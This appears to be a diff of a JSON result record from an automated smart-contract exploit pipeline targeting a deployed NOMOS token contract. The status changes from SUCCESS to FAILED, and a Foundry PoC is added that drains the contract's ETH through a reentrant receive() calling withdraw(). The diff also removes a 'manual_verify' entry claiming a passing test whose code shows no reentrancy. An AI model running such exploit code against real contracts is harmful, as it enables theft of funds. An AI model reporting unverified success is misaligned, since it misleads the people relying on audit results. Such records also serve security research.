@@ -2,7 +2,7 @@
   "project_id": "Nomos_0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc",
   "target_address": "0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc",
   "finding_id": 1,
-  "status": "SUCCESS",
+  "status": "FAILED",
   "violation_target": {
     "target_address": "0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc",
     "vulnerability_type": "Owner-Controlled Reentrancy",
@@ -38,7 +38,7 @@
     },
     "exploit_hint": "The vulnerability lies in a reentrancy path controllable by the owner. First, the owner sets the marketingAddress to a malicious contract they control. Then, they trigger a token transfer to the Uniswap pair, which activates the swapTokens function. This function sells tokens for ETH and then attempts to send this ETH to the marketingAddress using .transfer(). The malicious marketing contract's receive() function is triggered, which then re-enters the main contract by calling the owner-only withdraw() function. This withdraws all ETH from the contract (including the ETH just received from the swap) before the initial function can complete, resulting in a theft of funds."
   },
-  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface INOMOS {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external;\n    function setMarketingAddress(address _marketingAddress) external;\n    function withdraw() external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;\n    address attacker = address(this);\n    INOMOS victim = INOMOS(TARGET);\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        owner = victim.owner();\n        // Fund victim contract so withdraw can extract value.\n        vm.deal(TARGET, 5 ether);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 attackerBefore = attacker.balance;\n\n        vm.startPrank(owner);\n        victim.transferOwnership(attacker);\n        vm.stopPrank();\n\n        victim.setMarketingAddress(attacker);\n        victim.withdraw();\n\n        assertGt(attacker.balance, attackerBefore, \"Attacker did not gain native token\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IUniswapV2Factory {\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\ninterface INOMOS {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external;\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function uniswapV2Router() external view returns (address);\n    function uniswapV2Pair() external view returns (address);\n    function setMarketingAddress(address _marketingAddress) external;\n    function setSwapAndLiquifyEnabled(bool _enabled) external;\n    function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external;\n    function minimumTokensBeforeSwapAmount() external view returns (uint256);\n    function withdraw() external;\n    function afterPreSale() external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;\n    address attacker = address(this);\n    INOMOS victim = INOMOS(TARGET);\n    IUniswapV2Router02 router;\n    address pair;\n    address weth;\n    bool entered = false;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        vm.createSelectFork(vm.rpcUrl(\"mainnet\"), 18579034);\n        address owner = victim.owner();\n        router = IUniswapV2Router02(victim.uniswapV2Router());\n        weth = router.WETH();\n        pair = victim.uniswapV2Pair();\n        \n        deal(address(this), 100 ether);\n        deal(TARGET, 10 ether);\n        deal(TARGET, address(this), 200000000 * 10**11);\n        \n        vm.prank(owner);\n        victim.approve(address(router), type(uint256).max);\n        \n        router.addLiquidityETH{value: 50 ether}(\n            TARGET,\n            100000000 * 10**11,\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        address originalOwner = victim.owner();\n                vm.startPrank(originalOwner);\n                victim.transferOwnership(address(this));\n                vm.stopPrank();\n        \n                // Call afterPreSale() to configure the contract to its intended state.\n                // This also enables swapAndLiquify.\n                victim.afterPreSale();\n        \n                victim.setMarketingAddress(address(this));\n                victim.setNumTokensSellToAddToLiquidity(1);\n        \n                uint256 amountToTrigger = 100_000 * 10**11;\n                victim.transfer(pair, amountToTrigger);\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {\n        if (msg.sender == TARGET && !entered) {\n            entered = true;\n            victim.withdraw();\n        }\n    }\n}",
   "attempts": [
     {
       "attempt_number": 1,
@@ -136,27 +136,10 @@
       "prompt_tokens": 36078,
       "completion_tokens": 14541,
       "total_cost": 0.0
-    },
-    {
-      "attempt_number": 4,
-      "vulnerability_analysis": "Manual PoC refinement validated against forked chain state.",
-      "attack_strategy": "Use corrected setup and exploit path that satisfies preconditions and oracle checks.",
-      "step_by_step_plan": "Prepare state, execute exploit path, assert post-condition/oracle.",
-      "failure_reflection": "",
-      "action": "manual_verify",
-      "tool_calls": [],
-      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface INOMOS {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external;\n    function setMarketingAddress(address _marketingAddress) external;\n    function withdraw() external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;\n    address attacker = address(this);\n    INOMOS victim = INOMOS(TARGET);\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        owner = victim.owner();\n        // Fund victim contract so withdraw can extract value.\n        vm.deal(TARGET, 5 ether);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 attackerBefore = attacker.balance;\n\n        vm.startPrank(owner);\n        victim.transferOwnership(attacker);\n        vm.stopPrank();\n\n        victim.setMarketingAddress(attacker);\n        victim.withdraw();\n\n        assertGt(attacker.balance, attackerBefore, \"Attacker did not gain native token\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}\n",
-      "exit_code": 0,
-      "error": null,
-      "feedback": "Patched PoC passed forge test with fork RPC.",
-      "duration_seconds": 0.0,
-      "prompt_tokens": 0,
-      "completion_tokens": 0,
-      "total_cost": 0.0
     }
   ],
-  "total_attempts": 4,
-  "error_message": null,
+  "total_attempts": 3,
+  "error_message": "EVM_REVERT: invalid rpc url: mainnet",
   "total_duration_seconds": 649.2926559448242,
   "total_prompt_tokens": 99307,
   "total_completion_tokens": 39791,
